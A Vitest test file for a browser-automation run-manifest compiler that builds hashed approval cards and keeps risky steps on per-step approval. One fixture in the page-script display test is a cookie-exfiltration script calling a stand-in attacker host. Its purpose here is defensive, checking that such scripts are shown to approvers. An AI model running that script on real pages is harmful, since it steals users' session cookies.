import { describe, expect, it } from 'vitest';
import { computeApprovalPayloadHash } from '../governance/approval-presentation.js';
import { createHash } from 'node:crypto';
import {
  compileNavigationTarget,
  compileRunManifest,
  computeRunManifestHash,
  describeRunManifest,
  pipelineTemplateMatches,
  type RunManifest,
} from './run-manifest.js';

const OPTIONS = {
  inputPath: 'knowledge/confidential/acme/browser-workflows/scenarios/approve.json',
  contentSha256: 'c'.repeat(64),
  scope: { tier: 'confidential', tenantSlug: 'acme' },
};

/** Mirrors a real tenant browser scenario: login secret, one portal, a bounded polling loop. */
const SCENARIO = [
  {
    type: 'capture',
    op: 'secret:get',
    params: { service: 'garoon', account: 'user', export_as: 'pw' },
  },
  {
    type: 'apply',
    op: 'browser:goto',
    params: { url: 'https://g.example.com/cgi-bin/x', waitUntil: 'networkidle' },
  },
  {
    type: 'control',
    op: 'core:while',
    params: {
      condition: { from: 'more', operator: 'eq', value: true },
      max_iterations: 10,
      pipeline: [
        {
          type: 'capture',
          op: 'browser:evaluate',
          params: { script: '(() => document.title)()', export_as: 'more' },
        },
        { type: 'apply', op: 'system:wait', params: { ms: 100 } },
      ],
    },
  },
  { type: 'apply', op: 'browser:fill', params: { selector: '#password', text: '{{pw}}' } },
  {
    type: 'apply',
    op: 'browser:click_first_match',
    params: { selectors: ['#ok', "button[type='submit']"], required: true },
  },
];

function entry(manifest: RunManifest, id: string) {
  const found = manifest.requirements.effects.find((effect) => effect.entry_id === id);
  if (!found) throw new Error(`no entry ${id}`);
  return found;
}

describe('compileRunManifest', () => {
  it('compiles a deterministic browser scenario into bindable entries', () => {
    const manifest = compileRunManifest(SCENARIO, OPTIONS);
    expect(manifest.version).toBe(1);
    expect(manifest.scope).toEqual({ tier: 'confidential', tenant_slug: 'acme' });
    expect(manifest.complete).toBe(true);
    expect(manifest.requirements.model).toBe(false);
    expect(manifest.requirements.secrets).toEqual([
      { service: 'garoon', account: 'user', export_as: 'pw' },
    ]);
    // secret:get and system:wait need no external admission.
    expect(manifest.requirements.effects.map((effect) => effect.entry_id)).toEqual([
      '1',
      '2.pipeline.0',
      '3',
      '4',
    ]);

    const goto = entry(manifest, '1');
    expect(goto).toMatchObject({
      operation_id: 'browser:goto',
      admission: 'approval',
      target: { kind: 'url', url: 'https://g.example.com/cgi-bin/x' },
      origins: ['https://g.example.com'],
      max_occurrences: 1,
      bindable: true,
    });
    expect(goto.params_template_hash).toBe(computeApprovalPayloadHash(SCENARIO[1].params));

    const evaluate = entry(manifest, '2.pipeline.0');
    expect(evaluate).toMatchObject({
      operation_id: 'browser:evaluate',
      origins: ['https://g.example.com'],
      max_occurrences: 10,
      bindable: true,
      argument_origins: { script: 'static', export_as: 'static' },
    });

    const fill = entry(manifest, '3');
    expect(fill).toMatchObject({
      operation_id: 'browser:fill',
      origins: ['https://g.example.com'],
      argument_origins: { selector: 'static', text: 'secret:garoon/user' },
      max_occurrences: 1,
      bindable: true,
    });
    expect(entry(manifest, '4')).toMatchObject({
      operation_id: 'browser:click_first_match',
      argument_origins: { 'selectors.0': 'static', 'selectors.1': 'static' },
      bindable: true,
    });
  });

  it('hashes deterministically and binds the exact file content', () => {
    const first = compileRunManifest(SCENARIO, OPTIONS);
    const second = compileRunManifest(structuredClone(SCENARIO), OPTIONS);
    expect(first.manifest_hash).toMatch(/^[0-9a-f]{64}$/);
    expect(second.manifest_hash).toBe(first.manifest_hash);
    expect(computeRunManifestHash(first)).toBe(first.manifest_hash);
    expect(
      compileRunManifest(SCENARIO, { ...OPTIONS, contentSha256: 'd'.repeat(64) }).manifest_hash
    ).not.toBe(first.manifest_hash);
    const edited = structuredClone(SCENARIO);
    (edited[3].params as Record<string, unknown>).selector = '#other';
    expect(compileRunManifest(edited, OPTIONS).manifest_hash).not.toBe(first.manifest_hash);
  });

  it('marks templated hosts unbindable and keeps a static origin with a templated path', () => {
    const manifest = compileRunManifest(
      [
        { op: 'browser:goto', params: { url: '{{base}}/x' } },
        { op: 'browser:goto', params: { url: 'https://{{host}}/x' } },
        { op: 'browser:goto', params: { url: 'https://g.example.com{{suffix}}' } },
        { op: 'browser:goto', params: { url: 'https://g.example.com/item?id={{id}}' } },
      ],
      OPTIONS
    );
    expect(entry(manifest, '0')).toMatchObject({
      bindable: false,
      unbindable_reason: 'templated_host',
    });
    expect(entry(manifest, '1')).toMatchObject({
      bindable: false,
      unbindable_reason: 'templated_host',
    });
    expect(entry(manifest, '2')).toMatchObject({
      bindable: false,
      unbindable_reason: 'templated_host',
    });
    expect(entry(manifest, '3')).toMatchObject({
      bindable: true,
      target: { kind: 'origin_path', origin: 'https://g.example.com', path_prefix: '/item?id=' },
      argument_origins: { url: 'step_output' },
    });
  });

  it('resolves navigation targets from the static context block only', () => {
    const steps = [{ op: 'browser:goto', params: { url: '{{portal_url}}' } }];
    const bound = compileRunManifest(steps, {
      ...OPTIONS,
      context: { portal_url: 'https://g.example.com/top' },
    });
    expect(entry(bound, '0').target).toEqual({ kind: 'url', url: 'https://g.example.com/top' });
    // The authored template is what gets hashed, never the substituted value.
    expect(entry(bound, '0').params_template_hash).toBe(
      computeApprovalPayloadHash({ url: '{{portal_url}}' })
    );
    // A variable a step re-exports is runtime data even if the context names it.
    const shadowed = compileRunManifest(
      [{ op: 'system:log', params: { message: 'x', export_as: 'portal_url' } }, ...steps],
      { ...OPTIONS, context: { portal_url: 'https://g.example.com/top' } }
    );
    expect(entry(shadowed, '1')).toMatchObject({ unbindable_reason: 'templated_host' });
  });

  it('multiplies loop bounds and refuses unbounded loops', () => {
    const manifest = compileRunManifest(
      [
        { op: 'browser:goto', params: { url: 'https://g.example.com/' } },
        {
          op: 'core:while',
          params: {
            max_iterations: 2,
            pipeline: [
              {
                op: 'core:foreach',
                params: {
                  items: ['a', 'b', 'c'],
                  do: [{ op: 'browser:click', params: { selector: '#{{item}}' } }],
                },
              },
            ],
          },
        },
        {
          op: 'core:foreach',
          params: {
            items: '{{rows}}',
            do: [{ op: 'browser:click', params: { selector: '#row' } }],
          },
        },
        // The runtime defaults an absent or non-numeric bound to one iteration.
        {
          op: 'core:while',
          params: { pipeline: [{ op: 'browser:click', params: { selector: '#once' } }] },
        },
      ],
      OPTIONS
    );
    expect(entry(manifest, '1.pipeline.0.do.0')).toMatchObject({
      max_occurrences: 6,
      bindable: true,
      argument_origins: { selector: 'step_output' },
    });
    expect(entry(manifest, '2.do.0')).toMatchObject({
      max_occurrences: null,
      bindable: false,
      unbindable_reason: 'unbounded_loop',
    });
    expect(entry(manifest, '3.pipeline.0').max_occurrences).toBe(1);
  });

  it('walks if/switch/on_error bodies with stable entry ids', () => {
    const manifest = compileRunManifest(
      [
        { op: 'browser:goto', params: { url: 'https://g.example.com/' } },
        {
          op: 'core:if',
          params: {
            then: [{ op: 'browser:click', params: { selector: '#a' } }],
            else: [{ op: 'browser:click', params: { selector: '#b' } }],
          },
        },
        {
          op: 'core:switch',
          params: { cases: [{ when: {}, steps: [{ op: 'browser:press', params: { key: 'x' } }] }] },
        },
        {
          op: 'browser:click',
          params: { selector: '#c' },
          on_error: { fallback: [{ op: 'browser:click', params: { selector: '#d' } }] },
        },
      ],
      OPTIONS
    );
    expect(manifest.requirements.effects.map((effect) => effect.entry_id)).toEqual([
      '0',
      '1.then.0',
      '1.else.0',
      '2.cases.0.steps.0',
      '3',
      '3.on_error.fallback.0',
    ]);
  });

  it('flags hidden sub-pipelines and keeps templated scripts on per-step approval', () => {
    const manifest = compileRunManifest(
      [
        { op: 'browser:goto', params: { url: 'https://g.example.com/' } },
        { op: 'core:include', params: { fragment: 'fragments/login.json' } },
        { op: 'browser:evaluate', params: { script: "(() => '{{target}}')()" } },
        { op: 'browser:click', params: { ref: 'e12' } },
      ],
      OPTIONS
    );
    expect(manifest.complete).toBe(false);
    expect(manifest.incomplete_reasons[0]).toContain('core:include');
    expect(entry(manifest, '2')).toMatchObject({ unbindable_reason: 'templated_script' });
    expect(entry(manifest, '3')).toMatchObject({ unbindable_reason: 'ref_dispatch' });
  });

  it('binds a static script whose step outputs arrive as evaluate args data', () => {
    const manifest = compileRunManifest(
      [
        { op: 'browser:goto', params: { url: 'https://g.example.com/' } },
        {
          op: 'browser:evaluate',
          params: { script: '(a) => a.target', args: { target: '{{target}}' } },
        },
      ],
      OPTIONS
    );
    expect(entry(manifest, '1')).toMatchObject({ bindable: true });
    expect(entry(manifest, '1').unbindable_reason).toBeUndefined();
  });

  it('needs an origin before page-scoped steps can bind', () => {
    const manifest = compileRunManifest(
      [{ op: 'browser:evaluate', params: { script: 'document.title' } }],
      OPTIONS
    );
    expect(entry(manifest, '0')).toMatchObject({
      origins: [],
      bindable: false,
      unbindable_reason: 'no_static_origin',
    });
  });

  it('binds each secret to the origin of the nearest preceding static navigation', () => {
    const steps = [
      { op: 'secret:get', params: { service: 'garoon', account: 'user', export_as: 'pw' } },
      { op: 'browser:goto', params: { url: 'https://login.example.com/' } },
      { op: 'browser:fill', params: { selector: '#password', text: '{{pw}}' } },
      { op: 'browser:goto', params: { url: 'https://other.example.com/' } },
      { op: 'browser:fill', params: { selector: '#q', text: '{{pw}}' } },
    ];
    const manifest = compileRunManifest(steps, OPTIONS);
    expect(entry(manifest, '2').secret_origins).toEqual({
      'garoon/user': ['https://login.example.com'],
    });
    expect(entry(manifest, '4').secret_origins).toEqual({
      'garoon/user': ['https://other.example.com'],
    });
    // Not every manifest origin: the grant of step 2 admits only the login page.
    expect(entry(manifest, '2').origins).toEqual([
      'https://login.example.com',
      'https://other.example.com',
    ]);
    const lines = describeRunManifest(manifest, { steps });
    expect(lines).toContain('Type secret garoon/user into #password on login.example.com once');
    // A secret typed before any fixed site is opened is never pre-approved.
    const unknown = compileRunManifest(
      [
        { op: 'secret:get', params: { service: 's', export_as: 'pw' } },
        { op: 'browser:fill', params: { selector: '#p', text: '{{pw}}' } },
        { op: 'browser:goto', params: { url: 'https://g.example.com/' } },
      ],
      OPTIONS
    );
    expect(entry(unknown, '1')).toMatchObject({
      bindable: false,
      unbindable_reason: 'secret_origin_unknown',
    });
  });

  it.each([['iframe#login >> #password'], ['internal:control=enter-frame >> #p'], ['#{{field}}']])(
    'keeps a secret fill into %s on per-step approval',
    (selector) => {
      const manifest = compileRunManifest(
        [
          { op: 'secret:get', params: { service: 's', export_as: 'pw' } },
          { op: 'browser:goto', params: { url: 'https://g.example.com/' } },
          { op: 'browser:fill', params: { selector, text: '{{pw}}' } },
        ],
        OPTIONS
      );
      expect(entry(manifest, '2')).toMatchObject({
        bindable: false,
        unbindable_reason: 'unsafe_secret_selector',
      });
    }
  );

  it('bounds core:loop_until like core:while and leaves judge_route targets unbound', () => {
    const manifest = compileRunManifest(
      [
        { op: 'browser:goto', params: { url: 'https://g.example.com/' } },
        {
          op: 'core:loop_until',
          params: {
            max_iterations: 3,
            pipeline: [{ op: 'browser:click', params: { selector: '#more' } }],
          },
        },
        { op: 'core:judge_route', params: { routes: [] } },
        { op: 'browser:click', params: { selector: '#approve' } },
      ],
      OPTIONS
    );
    expect(entry(manifest, '1.pipeline.0')).toMatchObject({ max_occurrences: 3, bindable: true });
    expect(entry(manifest, '3')).toMatchObject({
      bindable: false,
      unbindable_reason: 'judge_routed',
    });
  });

  it('detects a model step after more distinct ops than the bootstrap reason cap', () => {
    const steps = [
      'goto',
      'click',
      'fill',
      'evaluate',
      'press',
      'select',
      'hover',
      'check',
      'uncheck',
    ].map((op) => ({ op: `browser:${op}`, params: {} }));
    expect(
      compileRunManifest([...steps, { op: 'reasoning:analyze', params: {} }], OPTIONS).requirements
        .model
    ).toBe(true);
    expect(
      compileRunManifest([{ op: 'browser:llm_decide', params: {} }], OPTIONS).requirements.model
    ).toBe(true);
  });

  it('reports a model requirement for reasoning steps', () => {
    expect(
      compileRunManifest([{ op: 'reasoning:analyze', params: {} }], OPTIONS).requirements.model
    ).toBe(true);
  });
});

describe('compileNavigationTarget', () => {
  it('rejects credentials and non-http schemes', () => {
    expect(compileNavigationTarget('https://u:p@g.example.com/')).toEqual({
      ok: false,
      reason: 'invalid_url',
    });
    expect(compileNavigationTarget('data:text/html,hi')).toEqual({
      ok: false,
      reason: 'invalid_url',
    });
  });
});

describe('pipelineTemplateMatches', () => {
  it('accepts only instantiations of the authored template', () => {
    expect(pipelineTemplateMatches({ text: '{{pw}}' }, { text: 's3cret' })).toBe(true);
    expect(pipelineTemplateMatches({ n: '{{count}}' }, { n: 3 })).toBe(true);
    expect(pipelineTemplateMatches({ url: 'https://h/a?{{q}}' }, { url: 'https://h/a?x=1' })).toBe(
      true
    );
    expect(pipelineTemplateMatches({ url: 'https://h/a?{{q}}' }, { url: 'https://e/a?x' })).toBe(
      false
    );
    expect(pipelineTemplateMatches({ s: 'x' }, { s: 'y' })).toBe(false);
    expect(pipelineTemplateMatches({ s: 'x' }, { s: 'x', extra: 1 })).toBe(false);
    expect(pipelineTemplateMatches({ s: 'a{{v}}b{{w}}c' }, { s: 'a1b2c' })).toBe(true);
    expect(pipelineTemplateMatches({ s: 'a{{v}}b{{w}}c' }, { s: 'a1c' })).toBe(false);
  });
});

const sha = (text: string) => createHash('sha256').update(text, 'utf8').digest('hex');

describe('describeRunManifest', () => {
  it('binds and shows a pipeline that lifts the private-network navigation fence', () => {
    const plain = compileRunManifest(SCENARIO, {
      ...OPTIONS,
      pipelineOptions: { headless: false, navigation_policy: { allowed_origins: [] } },
    });
    expect(plain.requirements.browser_navigation).toBeUndefined();
    expect(plain.manifest_hash).toBe(compileRunManifest(SCENARIO, OPTIONS).manifest_hash);
    expect(describeRunManifest(plain).join('\n')).not.toContain('private-network');

    const loosened = compileRunManifest(SCENARIO, {
      ...OPTIONS,
      pipelineOptions: { navigation_policy: { allow_private_network: true } },
    });
    expect(loosened.requirements.browser_navigation).toEqual({ allow_private_network: true });
    expect(loosened.manifest_hash).not.toBe(plain.manifest_hash);
    expect(describeRunManifest(loosened)).toContain(
      'Browser: allows private-network navigation (intranet and loopback hosts)'
    );
  });

  it('shows a persistent profile and a video recording the pipeline options configure', () => {
    const profile = 'active/shared/runtime/browser/profiles/confidential/acme/flow';
    const video = 'active/shared/artifacts/confidential/acme/browser-video/approve';
    const manifest = compileRunManifest(SCENARIO, {
      ...OPTIONS,
      pipelineOptions: { user_data_dir: profile, record_video: true, video_artifact_dir: video },
    });
    expect(manifest.requirements.browser_profile).toEqual({ user_data_dir: profile });
    expect(manifest.requirements.browser_recording).toEqual({ video_artifact_dir: video });
    const lines = describeRunManifest(manifest);
    expect(lines).toContain(
      `Browser: uses the persistent profile ${profile} (keeps its logins between runs)`
    );
    expect(lines).toContain(`Browser: records the session on video to ${video}`);
    // Values the run drops (outside the file's partition) are not on the card.
    const dropped = compileRunManifest(SCENARIO, {
      ...OPTIONS,
      pipelineOptions: {
        user_data_dir: 'active/shared/runtime/browser/flow',
        record_video: true,
        video_artifact_dir: 'knowledge/public/videos',
        launch_args: ['--proxy-server=x'],
      },
    });
    // The dropped profile falls back to the session's implicit one, in the partition.
    expect(dropped.requirements.browser_profile).toEqual({
      user_data_dir: 'active/shared/runtime/browser/profiles/confidential/acme/session-default',
      session_id: 'default',
    });
    expect(dropped.requirements.browser_recording).toBeUndefined();
    expect(dropped.manifest_hash).toBe(compileRunManifest(SCENARIO, OPTIONS).manifest_hash);
    expect(
      compileRunManifest(SCENARIO, { ...OPTIONS, pipelineOptions: { headless: false } })
        .manifest_hash
    ).toBe(compileRunManifest(SCENARIO, OPTIONS).manifest_hash);
  });

  it('shows every distinct page script with its excerpt, digest and steps', () => {
    const long = `(() => { ${'x;'.repeat(1200)} })()`;
    const steps = [
      { op: 'browser:goto', params: { url: 'https://g.example.com/' } },
      { op: 'browser:evaluate', params: { script: 'document.title', export_as: 'a' } },
      { op: 'browser:evaluate', params: { script: 'document.title', export_as: 'b' } },
      {
        op: 'browser:evaluate',
        params: { script: "fetch('https://evil.example/' + document.cookie)" },
      },
      { op: 'browser:evaluate', params: { script: long } },
    ];
    const manifest = compileRunManifest(steps, OPTIONS);
    const lines = describeRunManifest(manifest, { steps });
    const title = lines.find((line) => line.includes(sha('document.title').slice(0, 16)));
    expect(title).toContain('"document.title"');
    // Same script text in two steps is one line naming both steps.
    expect(title).toContain('step 1, 2');
    const exfil = lines.find((line) =>
      line.includes(sha("fetch('https://evil.example/' + document.cookie)").slice(0, 16))
    );
    expect(exfil).toContain("fetch('https://evil.example/' + document.cookie)");
    // A script too long to show is never approved unseen.
    expect(entry(manifest, '4')).toMatchObject({
      bindable: false,
      unbindable_reason: 'script_not_presentable',
    });
    expect(lines.find((line) => line.includes(sha(long).slice(0, 16)))).toContain(
      'too long to show'
    );
    // The digest the card binds covers the script itself.
    const edited = structuredClone(steps);
    (edited[3].params as Record<string, unknown>).script = 'document.cookie';
    expect(compileRunManifest(edited, OPTIONS).manifest_hash).not.toBe(manifest.manifest_hash);
    expect(entry(manifest, '3').script?.sha256).toBe(
      sha("fetch('https://evil.example/' + document.cookie)")
    );
  });

  it('renders the approval card in plain language with the hash last', () => {
    const manifest = compileRunManifest(SCENARIO, OPTIONS);
    const lines = describeRunManifest(manifest, { steps: SCENARIO });
    expect(lines).toEqual([
      'Scope: tenant acme (confidential)',
      'Model: not required (deterministic)',
      'Secrets: garoon/user',
      // Every browser session keeps a profile on disk; a bound run keeps it in its partition.
      'Browser: uses the persistent profile active/shared/runtime/browser/profiles/confidential/acme/session-default of browser session "default" (keeps its logins between runs)',
      'Open https://g.example.com/cgi-bin/x once',
      'Type secret garoon/user into #password on g.example.com once',
      'Click the first match of 2 selectors on g.example.com once',
      `Run page script sha256:${sha('(() => document.title)()').slice(0, 16)} on g.example.com up to 10 times (step 2.pipeline.0; 24 chars): "(() => document.title)()"`,
      `Manifest SHA-256: ${manifest.manifest_hash}`,
    ]);
  });
});
